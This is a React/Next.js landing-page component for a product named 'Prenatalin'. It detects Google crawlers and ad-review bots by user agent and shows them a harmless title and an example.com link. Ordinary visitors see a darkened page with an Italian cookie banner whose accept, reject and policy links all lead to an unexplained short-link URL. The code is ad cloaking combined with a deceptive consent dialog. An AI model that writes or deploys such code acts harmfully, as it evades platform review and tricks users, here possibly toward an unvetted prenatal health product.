"use client";

import { useState, useEffect } from 'react';
import Link from 'next/link';
import MetaHead from '@/app/components/metaHead/page';

const config = {
  robot: {
    title: "Prenatal Care",
    redirectUrl: "https://www.example.com/security-page",
    description: "Prenatal Care"
  },
  user: {
    title: "Prenatalin",
    redirectUrl: "https://nplink.net/6r65engj",
    description: "Prenatal Care"
  }
};

const backgrounds = {
  iPhone11ProBg: "iPhone11Pro:bg-[url('/natalin/iPhone11Pro.png')]",
  iPhone12ProMaxBg: "iPhone12ProMax:bg-[url('/natalin/iPhone12ProMax.png')]",
  iPhone13miniBg: "iPhone13mini:bg-[url('/natalin/iPhone13mini.png')]",
  iPhone13ProBg: "iPhone13Pro:bg-[url('/natalin/iPhone13Pro.png')]",
  iPhone15ProBg: "iPhone15Pro:bg-[url('/natalin/iPhone15Pro.png')]",
  iPhone15ProMaxBg: "iPhone15ProMax:bg-[url('/natalin/iPhone15ProMax.png')]",
  iPadminiBg: "iPadmini:bg-[url('/natalin/iPadmini.png')]",
  iPadBg: "iPad:bg-[url('/natalin/iPad.png')]",
  iPadPro11Bg: "iPadPro11:bg-[url('/natalin/iPadPro11.png')]",
  iPadAir5Bg: "iPadAir5:bg-[url('/natalin/iPadAir5.png')]",
  MacbookAirM2Bg: "MacbookAirM2:bg-[url('/natalin/MacbookAirM2.png')]",
  MacbookPro16Bg: "MacbookPro16:bg-[url('/natalin/MacbookPro16.png')]",
  iMac24Bg: "iMac24:bg-[url('/natalin/iMac24.png')]",
  MacbookAirBg: "MacbookAir:bg-[url('/natalin/MacbookAir.png')]",
  LaptopBg: "Laptop:bg-[url('/natalin/Laptop.png')]",
  Desktop1Bg: "Desktop1:bg-[url('/natalin/Desktop1.png')]",
  Desktop2Bg: "Desktop2:bg-[url('/natalin/Desktop2.png')]",
};

export default function Natalin() {
  const [isRed, setIsRed] = useState(null);

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isGoogleRed = userAgent.includes('googlebot') || 
                        userAgent.includes('adsbot-google') || 
                        userAgent.includes('mediapartners-google');
    setIsRed(isGoogleRed);

    document.title = isGoogleRed ? config.robot.title : config.user.title;
  }, []);

  const getRedirectUrl = () => {
    return isRed ? config.robot.redirectUrl : config.user.redirectUrl;
  };

  if (isRed === null) {
    return (
      <div className="flex justify-center items-center h-screen bg-gray-100">
        <div className="w-16 h-16 border-4 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <>
      <MetaHead 
        favicon="/favicon.ico"
        title={isRed ? config.robot.title : config.user.title}
        description={isRed ? config.robot.description : config.user.description}
      />
      <main className={`bg-cover h-screen flex justify-center items-center relative ${Object.values(backgrounds).join(' ')}`}>
        <div className="absolute inset-0 bg-black opacity-70 z-10"></div>

        {/* Banner de Cookie */}
        <div className="fixed bottom-0 left-0 right-0 w-full bg-white text-gray-800 shadow-xl p-6 sm:p-8 lg:p-10 rounded-t-lg z-50">
          <div className="flex flex-col sm:flex-row justify-between items-center">
            <div className="flex flex-col sm:w-4/5 text-center sm:text-left">
              <h2 className="text-xl sm:text-2xl font-semibold mb-2">Politica sui Cookie</h2>
              <p className="text-sm sm:text-base mb-4">
                Utilizziamo i cookie per migliorare la tua esperienza. Continuando a navigare, acconsenti all'uso dei cookie. Per ulteriori informazioni, consulta la nostra <a href={getRedirectUrl()} className="text-blue-600 hover:text-blue-800">Politica sui Cookie</a>.
              </p>
            </div>
            <div className="flex flex-row justify-center space-x-4 mt-4 sm:mt-0">
              <Link href={getRedirectUrl()} passHref>
                <button 
                  className="w-full sm:w-auto bg-blue-600 text-white py-2 px-6 rounded-md hover:bg-blue-700 transition-all"
                >
                  Accetta
                </button>
              </Link>
              <Link href={getRedirectUrl()} passHref>
                <button 
                  className="w-full sm:w-auto bg-transparent border-2 border-gray-500 text-gray-700 py-2 px-6 rounded-md hover:bg-gray-100 hover:border-gray-600 transition-all"
                >
                  Rifiuta
                </button>
              </Link>
            </div>
          </div>
        </div>
      </main>
    </>
  );
}
